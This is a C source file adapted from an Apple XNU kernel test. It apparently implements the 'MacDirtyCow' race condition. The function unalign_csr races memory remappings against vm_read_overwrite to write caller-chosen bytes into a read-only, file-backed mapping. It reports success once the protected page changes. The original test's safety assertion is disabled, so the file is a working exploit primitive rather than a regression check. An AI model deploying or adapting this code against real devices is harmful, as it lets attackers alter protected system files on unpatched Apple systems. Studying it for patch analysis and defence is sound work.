#ifdef MDC
// from https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c
// modified to compile outside of XNU

#include <pthread.h>
#include <dispatch/dispatch.h>
#include <stdio.h>

#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>

#include <fcntl.h>
#include <sys/mman.h>

//vm_unaligned_copy_switch_race
#include "vm_unalign_csr.h"

#define T_QUIET
#define T_EXPECT_MACH_SUCCESS(a, b)
#define T_EXPECT_MACH_ERROR(a, b, c)
#define T_ASSERT_MACH_SUCCESS(a, b, ...)
#define T_ASSERT_MACH_ERROR(a, b, c)
#define T_ASSERT_POSIX_SUCCESS(a, b)
#define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { fprintf(stderr, c "\n"); exit(1); }}while(0)
#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { fprintf(stderr, c "\n"); exit(1); }}while(0)
#define T_ASSERT_TRUE(a, b, ...)
#define T_LOG(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)
#define T_DECL(a, b) static void a(void)
#define T_PASS(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)

struct contextual_structure {
	vm_size_t ob_sizing;
	vm_address_t vmaddress_zeroe;
	mach_port_t memory_entry_r_o;
	mach_port_t memory_entry_r_w;
	dispatch_semaphore_t currently_active_sem;
	pthread_mutex_t mutex_thingy;
	volatile bool finished;
};

//switcheroo_thread
static void *
sro_thread(__unused void *arg)
{
	kern_return_t kr;
	struct contextual_structure *ctx;

	ctx = (struct contextual_structure *)arg;
	/* tell main thread we're ready to run */
	dispatch_semaphore_signal(ctx->currently_active_sem);
	while (!ctx->finished) {
		/* wait for main thread to be done setting things up */
		pthread_mutex_lock(&ctx->mutex_thingy);
		if (ctx->finished) {
      pthread_mutex_unlock(&ctx->mutex_thingy);
			break;
		}
		/* switch e0 to RW mapping */
		kr = vm_map(mach_task_self(),
		    &ctx->vmaddress_zeroe,
		    ctx->ob_sizing,
		    0,         /* mask */
		    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
		    ctx->memory_entry_r_w,
		    0,
		    FALSE,         /* copy */
		    VM_PROT_READ | VM_PROT_WRITE,
		    VM_PROT_READ | VM_PROT_WRITE,
		    VM_INHERIT_DEFAULT);
		T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RW");
		/* wait a little bit */
		usleep(100);
		/* switch bakc to original RO mapping */
		kr = vm_map(mach_task_self(),
		    &ctx->vmaddress_zeroe,
		    ctx->ob_sizing,
		    0,         /* mask */
		    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
		    ctx->memory_entry_r_o,
		    0,
		    FALSE,         /* copy */
		    VM_PROT_READ,
		    VM_PROT_READ,
		    VM_INHERIT_DEFAULT);
		T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RO");
		/* tell main thread we're don switching mappings */
		pthread_mutex_unlock(&ctx->mutex_thingy);
		usleep(100);
	}
	return NULL;
}

//unaligned_copy_switch_race
bool unalign_csr(int file_to_bake, off_t the_offset_of_the_file, const void* what_do_we_overwrite_this_file_with, size_t what_is_the_length_of_this_overwrite_data) {
	bool retval = false;
	pthread_t th = NULL;
	int ret;
	kern_return_t kr;
	time_t start, duration;
#if 0
	mach_msg_type_number_t cow_read_size;
#endif
	vm_size_t copied_size;
	int loops;
	vm_address_t e2, e5;
	struct contextual_structure context1, *ctx;
	int kern_success = 0, kern_protection_failure = 0, kern_other = 0;
	vm_address_t ro_addr, tmp_addr;
	memory_object_size_t mo_size;

	ctx = &context1;
	ctx->ob_sizing = 256 * 1024;

	void* file_mapped = mmap(NULL, ctx->ob_sizing, PROT_READ, MAP_SHARED, file_to_bake, the_offset_of_the_file);
	if (file_mapped == MAP_FAILED) {
//		fprintf(stderr, "failed to map\n");
		return false;
	}
	if (!memcmp(file_mapped, what_do_we_overwrite_this_file_with, what_is_the_length_of_this_overwrite_data)) {
//		fprintf(stderr, "already the same?\n");
		munmap(file_mapped, ctx->ob_sizing);
		return true;
	}
	ro_addr = (vm_address_t)file_mapped;

	ctx->vmaddress_zeroe = 0;
	ctx->currently_active_sem = dispatch_semaphore_create(0);
    //c=dispatch_semaphore_create
	T_QUIET; T_ASSERT_NE(ctx->currently_active_sem, NULL, "wqdwqd");
	ret = pthread_mutex_init(&ctx->mutex_thingy, NULL);
	T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, "pthread_mutex_init");
	ctx->finished = false;
	ctx->memory_entry_r_w = MACH_PORT_NULL;
	ctx->memory_entry_r_o = MACH_PORT_NULL;
#if 0
	/* allocate our attack target memory */
	kr = vm_allocate(mach_task_self(),
	    &ro_addr,
	    ctx->ob_sizing,
	    VM_FLAGS_ANYWHERE);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate ro_addr");
	/* initialize to 'A' */
	memset((char *)ro_addr, 'A', ctx->ob_sizing);
#endif

	/* make it read-only */
	kr = vm_protect(mach_task_self(),
	    ro_addr,
	    ctx->ob_sizing,
	    TRUE,             /* set_maximum */
	    VM_PROT_READ);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_protect ro_addr");
	/* make sure we can't get read-write handle on that target memory */
	mo_size = ctx->ob_sizing;
	kr = mach_make_memory_entry_64(mach_task_self(),
	    &mo_size,
	    ro_addr,
	    MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
	    &ctx->memory_entry_r_o,
	    MACH_PORT_NULL);
	T_QUIET; T_ASSERT_MACH_ERROR(kr, KERN_PROTECTION_FAILURE, "make_mem_entry() RO");
	/* take read-only handle on that target memory */
	mo_size = ctx->ob_sizing;
	kr = mach_make_memory_entry_64(mach_task_self(),
	    &mo_size,
	    ro_addr,
	    MAP_MEM_VM_SHARE | VM_PROT_READ,
	    &ctx->memory_entry_r_o,
	    MACH_PORT_NULL);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RO");
    //c= wrong mem_entry size
	T_QUIET; T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->ob_sizing, "uwdihiu");
	/* make sure we can't map target memory as writable */
	tmp_addr = 0;
	kr = vm_map(mach_task_self(),
	    &tmp_addr,
	    ctx->ob_sizing,
	    0,         /* mask */
	    VM_FLAGS_ANYWHERE,
	    ctx->memory_entry_r_o,
	    0,
	    FALSE,         /* copy */
	    VM_PROT_READ,
	    VM_PROT_READ | VM_PROT_WRITE,
	    VM_INHERIT_DEFAULT);
	T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");
	tmp_addr = 0;
	kr = vm_map(mach_task_self(),
	    &tmp_addr,
	    ctx->ob_sizing,
	    0,         /* mask */
	    VM_FLAGS_ANYWHERE,
	    ctx->memory_entry_r_o,
	    0,
	    FALSE,         /* copy */
	    VM_PROT_READ | VM_PROT_WRITE,
	    VM_PROT_READ | VM_PROT_WRITE,
	    VM_INHERIT_DEFAULT);
	T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");

	/* allocate a source buffer for the unaligned copy */
	kr = vm_allocate(mach_task_self(),
	    &e5,
	    ctx->ob_sizing * 2,
	    VM_FLAGS_ANYWHERE);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e5");
	/* initialize to 'C' */
	memset((char *)e5, 'C', ctx->ob_sizing * 2);

	char* e5_overwrite_ptr = (char*)(e5 + ctx->ob_sizing - 1);
	memcpy(e5_overwrite_ptr, what_do_we_overwrite_this_file_with, what_is_the_length_of_this_overwrite_data);

	int overwrite_first_diff_offset = -1;
	char overwrite_first_diff_value = 0;
	for (int off = 0; off < what_is_the_length_of_this_overwrite_data; off++) {
		if (((char*)ro_addr)[off] != e5_overwrite_ptr[off]) {
			overwrite_first_diff_offset = off;
			overwrite_first_diff_value = ((char*)ro_addr)[off];
		}
	}
	if (overwrite_first_diff_offset == -1) {
        //b=no diff?
		fprintf(stderr, "uewiyfih");
		return false;
	}

	/*
	 * get a handle on some writable memory that will be temporarily
	 * switched with the read-only mapping of our target memory to try
	 * and trick copy_unaligned to write to our read-only target.
	 */
	tmp_addr = 0;
	kr = vm_allocate(mach_task_self(),
	    &tmp_addr,
	    ctx->ob_sizing,
	    VM_FLAGS_ANYWHERE);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate() some rw memory");
	/* initialize to 'D' */
	memset((char *)tmp_addr, 'D', ctx->ob_sizing);
	/* get a memory entry handle for that RW memory */
	mo_size = ctx->ob_sizing;
	kr = mach_make_memory_entry_64(mach_task_self(),
	    &mo_size,
	    tmp_addr,
	    MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
	    &ctx->memory_entry_r_w,
	    MACH_PORT_NULL);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RW");
    //c=wrong mem_entry size
	T_QUIET; T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->ob_sizing, "weouhdqhuow");
	kr = vm_deallocate(mach_task_self(), tmp_addr, ctx->ob_sizing);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate() tmp_addr 0x%llx", (uint64_t)tmp_addr);
	tmp_addr = 0;

	pthread_mutex_lock(&ctx->mutex_thingy);

	/* start racing thread */
	ret = pthread_create(&th, NULL, sro_thread, (void *)ctx);
	T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, "pthread_create");

	/* wait for racing thread to be ready to run */
	dispatch_semaphore_wait(ctx->currently_active_sem, DISPATCH_TIME_FOREVER);

	duration = 10; /* 10 seconds */
//	T_LOG("Testing for %ld seconds...", duration);
	for (start = time(NULL), loops = 0;
	    time(NULL) < start + duration;
	    loops++) {
		/* reserve space for our 2 contiguous allocations */
		e2 = 0;
		kr = vm_allocate(mach_task_self(),
		    &e2,
		    2 * ctx->ob_sizing,
		    VM_FLAGS_ANYWHERE);
		T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate to reserve e2+e0");

		/* make 1st allocation in our reserved space */
		kr = vm_allocate(mach_task_self(),
		    &e2,
		    ctx->ob_sizing,
		    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(240));
		T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e2");
		/* initialize to 'B' */
		memset((char *)e2, 'B', ctx->ob_sizing);

		/* map our read-only target memory right after */
		ctx->vmaddress_zeroe = e2 + ctx->ob_sizing;
		kr = vm_map(mach_task_self(),
		    &ctx->vmaddress_zeroe,
		    ctx->ob_sizing,
		    0,         /* mask */
		    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(241),
		    ctx->memory_entry_r_o,
		    0,
		    FALSE,         /* copy */
		    VM_PROT_READ,
		    VM_PROT_READ,
		    VM_INHERIT_DEFAULT);
		T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() mem_entry_ro");

		/* let the racing thread go */
		pthread_mutex_unlock(&ctx->mutex_thingy);
		/* wait a little bit */
		usleep(100);

		/* trigger copy_unaligned while racing with other thread */
		kr = vm_read_overwrite(mach_task_self(),
		    e5,
		    ctx->ob_sizing - 1 + what_is_the_length_of_this_overwrite_data,
		    e2 + 1,
		    &copied_size);
		T_QUIET;
		T_ASSERT_TRUE(kr == KERN_SUCCESS || kr == KERN_PROTECTION_FAILURE,
		    "vm_read_overwrite kr %d", kr);
		switch (kr) {
		case KERN_SUCCESS:
			/* the target was RW */
			kern_success++;
			break;
		case KERN_PROTECTION_FAILURE:
			/* the target was RO */
			kern_protection_failure++;
			break;
		default:
			/* should not happen */
			kern_other++;
			break;
		}
		/* check that our read-only memory was not modified */
#if 0
        //c = RO mapping was modified
		T_QUIET; T_ASSERT_EQ(((char *)ro_addr)[overwrite_first_diff_offset], overwrite_first_diff_value, "cddwq");
#endif
		bool is_still_equal = ((char *)ro_addr)[overwrite_first_diff_offset] == overwrite_first_diff_value;

		/* tell racing thread to stop toggling mappings */
		pthread_mutex_lock(&ctx->mutex_thingy);

		/* clean up before next loop */
		vm_deallocate(mach_task_self(), ctx->vmaddress_zeroe, ctx->ob_sizing);
		ctx->vmaddress_zeroe = 0;
		vm_deallocate(mach_task_self(), e2, ctx->ob_sizing);
		e2 = 0;
		if (!is_still_equal) {
			retval = true;
//			fprintf(stderr, "RO mapping was modified\n");
			break;
		}
	}

	ctx->finished = true;
	pthread_mutex_unlock(&ctx->mutex_thingy);
	pthread_join(th, NULL);

	kr = mach_port_deallocate(mach_task_self(), ctx->memory_entry_r_w);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_rw)");
	kr = mach_port_deallocate(mach_task_self(), ctx->memory_entry_r_o);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_ro)");
	kr = vm_deallocate(mach_task_self(), ro_addr, ctx->ob_sizing);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(ro_addr)");
	kr = vm_deallocate(mach_task_self(), e5, ctx->ob_sizing * 2);
	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(e5)");

//#if 0
//	T_LOG("vm_read_overwrite: KERN_SUCCESS:%d KERN_PROTECTION_FAILURE:%d other:%d",
//	    kern_success, kern_protection_failure, kern_other);
//	T_PASS("Ran %d times in %ld seconds with no failure", loops, duration);
//#endif
	return retval;
}
#endif /* MDC */